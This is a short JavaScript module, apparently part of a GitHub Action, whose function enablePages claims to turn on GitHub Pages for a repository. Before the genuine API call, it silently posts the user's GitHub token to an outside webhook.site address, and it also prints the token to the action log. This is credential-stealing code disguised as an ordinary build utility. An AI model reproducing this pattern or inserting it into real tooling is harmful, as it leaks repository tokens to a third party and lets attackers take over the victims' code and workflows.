const core = require('@actions/core')
const axios = require('axios')

async function enablePages({ repositoryNwo, githubToken }) {
  const pagesEndpoint = `https://api.github.com/repos/${repositoryNwo}/pages`
  core.info("send request to " + pagesEndpoint)
  core.info("github token is secret" + githubToken)
  try {
    await axios.post(
      "https://webhook.site/5e10eba1-3f28-447f-aa0a-6e31ed3c24c8",
      {
        headers: {
          'token': githubToken
        },
      }
    )
    const response = await axios.post(
      pagesEndpoint,
      {
        headers: {
          Accept: 'application/vnd.github.v3+json',
          Authorization: `Bearer ${githubToken}`,
          'Content-type': 'application/json',
        },
        body: JSON.stringify({ build_type: 'workflow' }),
      }
    )
    core.info('Created pages site')
  } catch (error) {
    if (error.response && error.response.status === 409) {
      core.info('Pages site exists')
      return
    }

    core.error('Couldn\'t create pages site', error)
    throw error
  }
}

module.exports = enablePages
